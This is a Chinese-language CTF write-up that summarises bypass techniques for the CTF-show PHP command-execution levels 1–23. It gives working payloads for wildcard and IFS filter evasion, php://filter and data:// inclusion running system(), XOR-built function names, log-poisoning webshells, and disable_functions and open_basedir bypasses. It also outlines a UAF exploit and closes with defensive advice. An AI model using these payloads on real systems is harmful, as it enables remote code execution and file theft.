---
title: CTF-show PHP 命令执行漏洞利用与绕过技术全景实战总结
description: 系统梳理 CTF-show 平台 Web 命令执行关卡（第 1-23 关）的核心绕过技术，涵盖命令替换、通配符利用、参数逃逸、文件包含伪协议、短标签、变量异或构造、无字母数字
  RCE、disable_functions/open_basedir 绕过、Bash 内置变量展开等完整攻击链，构建 PHP 命令执行攻防知识体系。
category: program-analysis
tags:
- CTF
- PHP
- Command Execution
- Bypass Techniques
- CTF-show
- Web Security
- RCE
- Pseudo Protocols
- Bash Variable Expansion
- Disable Functions Bypass
date: 2024-12-19
updated: '2026-11-14'
---
## 概述

本页面基于无名安全团队 N1vRANA 的微信公众号归档文章《CTF-show命令代码执行实践》整理，系统复盘 CTF-show 平台 **Web 命令执行** 系列关卡（共 23 关）的核心利用思路与绕过技术。内容覆盖从基础命令注入到高级无字母数字 RCE、内存马植入、沙箱逃逸的完整技术栈，适合 CTF 选手、渗透测试工程师及 PHP 安全研究者构建结构化知识库。

> **交叉引用**：PHP Webshell 基础原理与蚁剑流量分析见 [[php-webshell-fundamentals-chopper-analysis]]；多态混淆免杀技术见 [[php-webshell-obfuscation-av-evasion]]。

---

## 一、核心函数与执行载体

| 函数 / 结构 | 执行方式 | 典型场景 |
|-------------|----------|----------|
| `system()` / `exec()` / `shell_exec()` / `passthru()` / `popen()` | 直接命令执行 | 关卡 1-3、12-18 |
| `` `cmd` `` (反引号) | 等价于 `shell_exec()` | 关卡 2 |
| `eval()` | PHP 代码执行 | 关卡 3、11、12、22 |
| `include` / `require` / `include_once` / `require_once` | 文件包含 → 代码执行 | 关卡 4-10 |
| `assert()` / `preg_replace('/e')` / `call_user_func()` | 回调型代码执行 | 扩展场景 |

---

## 二、关卡按技术分类汇总

### 命令注入基础绕过（关卡 1-3）

| 关卡 | 过滤点 | 核心 Payload | 技术要点 |
|------|--------|--------------|----------|
| 1 | 仅过滤 `flag` | `c=cp fla?.php 1.txt` | Shell 通配符 `?` `*` 绕过关键字过滤 |
| 2 | 过滤 `flag\|system\|php` | `c=`nl flag.php`` | 反引号命令替换；`nl`/`tac`/`cat`/`more`/`less`/`head`/`tail`/`sed`/`awk`/`strings`/`od` 等读文件命令均可替代 |
| 3 | 过滤 `flag\|system\|php\|cat\|sort\|shell\|\.\| \|\'\|` | `c=eval($_GET[1]);&1=system('ls')` | **参数逃逸**：外层 `eval` 执行 PHP，内层通过 `$_GET` 传入二次 Payload |

> **技巧汇总**（文章开头代码块）：
> - 转义绕过：`` `nl fl''ag.php` ``、`` `nl fl""ag.php` ``、`` `nl fl\ag.php` ``
> - 通配符：`fla?*`、`fl[a-z]*`、`fl[abc]*`
> - 空格替代：`${IFS}`、`$IFS$1`、`$IFS$9`、`%09`(Tab)、`%20`
> - 重定向：`<flag.php`、`<>flag.php`
> - 拼接：`a=g;cat$IFS$1fla$a.php`

### 文件包含与伪协议（关卡 4-10）

| 关卡 | 过滤增量 | 核心 Payload | 关键点 |
|------|----------|--------------|--------|
| 4 | 增加 `\` `|` `echo` `;` `(` | `include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php` | `%0a`(换行) 绕过正则；`php://filter` 读取源码 |
| 5 | 增加 `"` | 同 4，`require` 同理 | `require` 同样支持伪协议 |
| 6 | 增加 `:` | 同上 | `:` 未实质阻断伪协议 |
| 7 | 增加 `<` `=` | 同上 | |
| 8 | 增加 `/` `[0-9]` | `include%0a$_GET[a]?>&1=php://filter/...` | 参数名换字母绕过数字过滤 |
| 9 | 仅过滤 `flag`，改用 `include($c)` | `include%0a$_GET[1]?>&1=data://text/plain,<?php system('cp fla?.php 1.txt');?>` | **data:// 伪协议**直接执行 PHP 代码；可写 Webshell |
| 10 | 增加 `php` `file` | `include%0a$_GET[1]?>&1=data://text/plain,<?=system("cp fl*.* 1.txt");?>` | **短标签 `<?= ?>`** 绕过 `php` 关键字 |

> **伪协议速查**：
> - `php://filter/read=convert.base64-encode/resource=flag.php` —— 读取源码并 Base64
> - `data://text/plain,<?php system('cmd');?>` —— 直接执行 PHP
> - `data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==` —— Base64 编码版
> - `phar://`、`zip://`、`glob://` 等配合文件上传/压缩包利用见 [[php-webshell-obfuscation-av-evasion]]

### 变量函数与数组操作绕过（关卡 11）

**过滤**：全符号表（数字、字母、常见符号均过滤）

**核心思路**：
1. `get_defined_vars()` 获取当前作用域所有变量（包含 `$_GET`/`$_POST` 等超全局）
2. `next()` 移动数组指针指向可控输入
3. `array_pop()` 取出该值
4. `eval()` 执行

```php
eval(array_pop((next(get_defined_vars()))));
// 配合 ?1=system("tac fla?.php");
```

> **延伸**：`current()`/`next()`/`prev()`/`end()`/`reset()` 等数组指针函数配合 `array_pop`/`array_shift` 可实现无字母数字代码执行。

### 异或构造无字母数字 RCE（关卡 12）

**过滤**：数字、小写字母、`` ` `` `+` `~` `$` `[` `]` `{` `}` `&` `-`

**原理**：PHP 中字符串异或 `"A" ^ "="` 可生成任意字符。编写脚本枚举两个**非受限字符**异或得到目标函数名（如 `system`、`phpinfo`、`assert`），再动态调用。

```php
// 生成器核心逻辑
for ($i=0;$i<256;$i++) for ($j=0;$j<256;$j++)
  if (!preg_match('/[0-9a-z\^+\~\$\[\]\{\}\&\-]/', chr($i).chr($j)))
    if ((chr($i) ^ chr($j)) === 's') // 目标字符
      记录可用字符对
```

**实战**：构造 `("~"^"@")("~"^"@"...")()` 形式的调用链，配合 Python 自动化脚本批量生成 Payload。

> **同类技术**：[[php-webshell-obfuscation-av-evasion]] 中“Stage 2 XOR-splits characteristic functions”即同源思路。

### 输出重定向与操作符绕过（关卡 13-15）

| 关卡 | 过滤 | 核心技术 |
|------|------|----------|
| 13 | 无过滤但回显被吞 | `cmd >/dev/null 2>&1` 丢弃输出；配合 `||`、`%26%26`、`|` 执行后续命令 |
| 14 | 过滤 `;` `cat` | `%26%26` (URL 编码 `&&`) 实现命令连接 |
| 15 | 过滤 `;` `空格` `cat` | `%09` (Tab)、`${IFS}` 替代空格 |

### 少见命令与重定向技巧（关卡 16-18）

| 关卡 | 命令 | Payload 示例 | 绕过点 |
|------|------|--------------|--------|
| 16 | `nl` | `c=nl<flag.php||ls` | `<` 输入重定向读文件；`||` 短路执行后续命令 |
| 17 | `mv` | `c=mv flag.php 1.txt||ls` | 重命名文件绕过 `cat` 过滤；`||` 需 URL 编码 `%7C%7C` |
| 18 | `tac` | `c=ta"c${IFS}fla?.php` | 双引号打断关键字 `tac`；`${IFS}` 替代空格 |

### 无字母数字文件上传 RCE（关卡 19-21）

**场景**：前端上传点 + 后端 `eval` 执行文件名/内容，过滤极严（仅允许极少字符）。

| 关卡 | 核心突破 | 关键 Payload |
|------|----------|--------------|
| 19 | 通配符 `?` `[@-[]` 匹配大写字母 | `c=.+/???/????????[@-[]` 配合 Python 爆破路径；上传 `cat flag.php` 作为文件内容 |
| 20 | 利用 `$_` 等特殊变量、`$?` 返回值构造字符 | 结合 Bash 变量展开生成所需字符，写入并执行 |
| 21 | 过滤数字 → 取反构造 | `${_}` 获取上一命令 PID 等非数字特征值，配合取反/位运算构造数字 |

> **实战脚本模式**：
> ```python
> while True:
>     r = requests.post(url, params={'c': payload}, files={'file': ('1.php', 'cat flag.php')})
>     if 'flag' in r.text: break
> ```

---

## 三、进阶：禁用函数与沙箱逃逸（关卡 22）

### 信息收集
```php
phpinfo(); // 查看 disable_functions、open_basedir、extension_dir 等
```

### 常见绕过向量

| 向量 | 适用条件 | 核心代码片段 |
|------|----------|--------------|
| **include/require 伪协议** | 未禁用 `include` | `include('php://filter/...')`、`include('data://...')` |
| **日志包含** | 写权限 + 已知日志路径 | 1. UA 写入 `<?php eval($_POST[x]);?>` 2. `include('/var/log/apache2/access.log')` |
| **highlight_file / show_source** | 函数未禁用 | `highlight_file('flag.php')` 直接回显源码 |
| **session 文件包含** | `session.save_handler=files` 可控 `session_id` | `session_id('<?php system("cmd");?>'); session_start(); include('/var/lib/php/sess_...')` |
| **LD_PRELOAD 劫持** | `putenv`/`mail`/`imap`/`error_log` 未禁用 | 编译恶意 `.so`，`putenv('LD_PRELOAD=/tmp/evil.so')` 触发 |
| **PCNTL 执行** | `pcntl_exec` 未禁用 | `pcntl_exec('/bin/bash', ['-c', 'cmd'])` |
| **FFI (PHP 7.4+)** | `ffi.enable=true` | `FFI::cdef()->system('cmd')` |
| **Imagick/Ghostscript** | 扩展加载 + 委托配置 | CVE-2019-10101 等委托链 RCE |
| **bypass_open_basedir** | `open_basedir` 限制目录 | 利用 `DirectoryIterator('glob:///*')` 遍历、`chdir()` 突破、错误日志竞争、`ini_set('open_basedir','..')` 等 |
| **UAF/GC 利用 (PHP 7.x)** | 无禁用函数但内存保护弱 | 文章末尾给出完整 `ctfshow()` UAF 利用链：泄露二进制基址 → 解析 ELF → 定位 `zif_system` → 伪造对象劫持控制流 → `system('cat /flag0.txt')` |

> **UAF 利用链关键类**：`Vuln` (析构触发)、`Helper` (指针读写原语)、`Exception` (获取回溯栈地址) → 任意地址读写 → 劫持 `basic_functions` 表中 `system` 函数指针。

### 数据库 UDF / PDO 读文件
```php
new PDO('mysql:host=localhost;dbname=ctftraining','root','root');
foreach($dbh->query('select load_file("/flag36.txt")') as $row) echo $row[0];
```

---

## 四、极限环境：Bash 内置变量展开绕过（关卡 23）

**场景**：`system()` 执行，但过滤了**所有字母、数字、常见符号、环境变量名 (PATH/HOME/BASH/PWD 等)**，长度 ≤ 65。

### 核心语法

| 语法 | 含义 | 示例 |
|------|------|------|
| `${var:~N}` | 取变量 `var` 最后 N 位 | `${PATH:~0}` → `n` (PATH 以 `bin` 结尾) |
| `${#var}` | 变量值长度 | `${#SHLVL}` → `1` (默认 SHLVL=1) |
| `${var:offset:length}` | 子串切片 | `${PWD:${#SHLVL}}` → 从第 1 字符开始取 |
| `$?` | 上一命令返回码 | 成功为 `0`，失败非 `0` |
| `${##}` / `${#?}` | 长度为 1 的数字构造 | 替代 `${#SHLVL}` |

### 字符拼接构造命令

目标：构造 `cat flag.php` 或 `rev<<<...` 等命令。

**可用变量**：`PWD`(当前目录)、`USER`、 `HOSTNAME`、 `HOME` 等**未被过滤**的环境变量（需实测）。

**典型片段**：
```bash
# 获取 '/' (PWD 首字符)
${PWD::${#SHLVL}}          # 或 ${PWD:${#?}} (若 $?=0)

# 获取 't' (HOME 第 13 字符)
${HOME:${#HOSTNAME}:${#SHLVL}}

# 获取 'c' (USER 最后一位)
${USER:~A}   # ~A 等同 ~0，取最后一位

# 组合：cat flag.php
${PWD::${#?}}${HOME:${#HOSTNAME}:${#?}}${USER:~A}<???.???
```
需配合 `rev` 反转、通配符 `?` `*` 补全文件名，并通过**多次刷新**解决 `$?` 不稳定问题。

### 进阶过滤应对

| 额外过滤 | 应对策略 |
|----------|----------|
| 过滤 `PWD` `SHLVL` `HOME` `HOSTNAME` `USER` | 寻找未过滤变量 (`_`、`OLDPWD`、`SHELL` 等) 或利用 `${##}`/`${#?}` 构造数字 |
| 过滤 `#` `?` `~` | 利用 `${!var}` 间接引用、命令替换 `$()`(若未过滤) |
| 过滤 `_` | 利用 `$0` (脚本名)、`$$` (PID) 等特殊参数 |

---

## 五、知识图谱与交叉引用

```mermaid
graph TD
  A[CTF-show 命令执行全景] --> B[基础注入 1-3]
  A --> C[文件包含/伪协议 4-10]
  A --> D[变量/数组/异或 11-12]
  A --> E[操作符/重定向/少见命令 13-18]
  A --> F[无字母数字上传 19-21]
  A --> G[禁用函数/沙箱逃逸 22]
  A --> H[Bash 变量展开极限绕过 23]

  C --> C1[php://filter]
  C --> C2[data://]
  C --> C3[短标签 <?= ?>]
  G --> G1[日志包含]
  G --> G2[highlight_file/show_source]
  G --> G3[LD_PRELOAD/FFI/PCNTL]
  G --> G4[UAF 内存利用]
  G --> G5[open_basedir 绕过]
  H --> H1[${var:~N} 尾部切片]
  H --> H2[${#var} 长度取数]
  H --> H3[rev + 通配符 补全命令]
```

**相关页面**：
- PHP Webshell 核心原理与流量分析 → [[php-webshell-fundamentals-chopper-analysis]]
- PHP 多态混淆免杀工程化实现 → [[php-webshell-obfuscation-av-evasion]]
- 条件竞争在文件上传/包含中的利用 → [[race-condition-vulnerability-analysis]]
- VulnHub 实战中命令执行链复现 → [[vulnhub-bbs-cute-102-writeup]]、[[vulnhub-chronos-writeup]]、[[vulnhub-darkhole2-writeup]]

---

## 六、速查表：高频绕过 Payload 模板

| 场景 | Payload 模板 | 关键点 |
|------|--------------|--------|
| 空格绕过 | `${IFS}`、`$IFS$1`、`$IFS$9`、`%09`、`%20` | Bash 内置变量 |
| 关键字打断 | `ca"t"`、`ca't'`、`c\at`、`ca${IFS}t` | 引号/转义/变量拼接 |
| 通配符读文件 | `cat fla?.php`、`cat fla*`、`cat fl[a-z]*`、`cat /???/fla?.php` | Shell 路径展开 |
| 重定向读文件 | `cat<flag.php`、`cat<>flag.php`、`nl<flag.php` | 输入重定向 |
| 命令连接 | `cmd1;cmd2`、`cmd1%0acmd2`、`cmd1%26%26cmd2`、`cmd1||cmd2` | `;` `\n` `&&` `||` |
| 伪协议包含 | `include('php://filter/read=convert.base64-encode/resource=flag.php')` | 读源码 |
| 伪协议执行 | `include('data://text/plain,<?php system("cmd");?>')` | 直接 RCE |
| 短标签执行 | `include('data://text/plain,<?=system("cmd");?>')` | 绕过 `php` 过滤 |
| 异或构造函数名 | `("~"^"@")("~"^"@"...")()` | 无字母数字 RCE |
| 数组指针取值 | `eval(array_pop(next(get_defined_vars())));` | 无字母数字 eval |
| Bash 尾部切片 | `${PATH:~0}` → `n`、`${HOME:~0}` → `e` | 构造命令首字符 |
| Bash 长度取数 | `${#SHLVL}` → `1`、`${#?}` → `1`、`${##}` → `1` | 切片偏移量 |
| 间接变量引用 | `${!var}` | 变量名动态构造 |

---

## 七、实战建议与防御视角

1. **代码审计重点**：搜索 `system/exec/shell_exec/passthru/popen/proc_open/eval/assert/include/require` 等危险函数，检查用户输入是否直接拼接。
2. **禁用函数配置**：`disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec,putenv,mail,imap_open,ld,dl,ffi.enable=0` 等。
3. **open_basedir 限制**：`open_basedir = /var/www/html:/tmp` 限制文件操作范围，防止 `glob://`、`DirectoryIterator` 遍历敏感目录。
4. **输入过滤策略**：
   - 白名单校验（命令参数、文件路径）
   - 避免黑名单正则（易被编码/拼接/变量绕过）
   - 使用 `escapeshellarg()`/`escapeshellcmd()` 配合参数化执行
5. **日志与监控**：记录 `system` 类函数调用参数、文件包含路径、异常 `eval` 代码；结合 RASP/WAF 检测异或、异常字符频次、超长参数。
6. **最小权限原则**：Web 进程以低权限用户运行，禁用 `proc_open`、`pcntl_fork` 等进程控制函数，限制 `/proc` `/sys` 访问。

---

## 八、参考资源

- 原文归档：[CTF-show命令代码执行实践](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247487060&idx=1&sn=2b17d19b05fc5f3dbb4b88f387166587)
- PHP 伪协议官方文档：`php://`、`data://`、`phar://`、`glob://`、`zip://`、`compress.zlib://`
- Bash 参数展开手册：`man bash` → *Parameter Expansion* 小节
- PHP 内存利用（UAF/GC）研究：`php7-gc-bypass`、`php7-uaf-exploit` 等公开 PoC
- CTF-show 官方平台：<https://ctf.show/>

## 来源

- [0x00实验室-202108-202304_057](../sources/0x00实验室-202108-202304_057.md)
